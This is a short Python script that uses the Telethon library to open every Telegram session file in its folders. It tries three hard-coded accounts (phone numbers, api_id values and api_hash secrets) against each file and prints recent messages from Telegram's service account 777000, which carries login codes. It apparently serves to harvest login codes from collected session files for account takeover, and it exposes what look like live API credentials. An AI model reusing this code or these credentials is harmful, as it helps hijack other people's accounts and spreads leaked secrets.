import asyncio
import os
import sys
import glob
from telethon import TelegramClient
from telethon.tl.types import PeerUser

# Account credentials provided
ACCOUNTS = [
    {
        "phone": "+447475643509",
        "api_id": 32950512,
        "api_hash": "23f5be247297fe7645193f6f782dad67"
    },
    {
        "phone": "+48455536804",
        "api_id": 31925523,
        "api_hash": "6448299ee7fb91c63cbc82511b435594"
    },
    {
        "phone": "+447727190089",
        "api_id": 39064636,
        "api_hash": "72d90d8ac46e9293e3d5254d9645e4f9"
    }
]

async def check_session_for_codes(session_path, api_id, api_hash):
    try:
        client = TelegramClient(session_path, api_id, api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            print(f"[-] Session {session_path}: Not authorized.")
            await client.disconnect()
            return
        
        me = await client.get_me()
        phone = getattr(me, 'phone', 'Unknown')
        print(f"\n[+] Connected to session '{session_path}' -> User: {me.first_name} (+{phone}, ID: {me.id})")
        
        # Get messages from official Telegram service notification (777000)
        messages = await client.get_messages(777000, limit=5)
        if messages:
            print(f"--- Recent Telegram Service Messages for +{phone} ---")
            for m in messages:
                date_str = m.date.strftime("%Y-%m-%d %H:%M:%S UTC")
                print(f"[{date_str}] (ID: {m.id}):\n{m.text}\n")
        else:
            print(f"No messages from 777000 found for +{phone}")
            
        await client.disconnect()
    except Exception as e:
        print(f"Error checking {session_path}: {e}")

async def main():
    sessions = glob.glob("sessions/*.session") + glob.glob("*.session")
    session_names = sorted(list(set([os.path.splitext(s)[0] for s in sessions])))
    print(f"Found session files: {session_names}")
    
    # Try all accounts with each session file or match phone
    for s_path in session_names:
        for acc in ACCOUNTS:
            await check_session_for_codes(s_path, acc["api_id"], acc["api_hash"])

if __name__ == "__main__":
    asyncio.run(main())
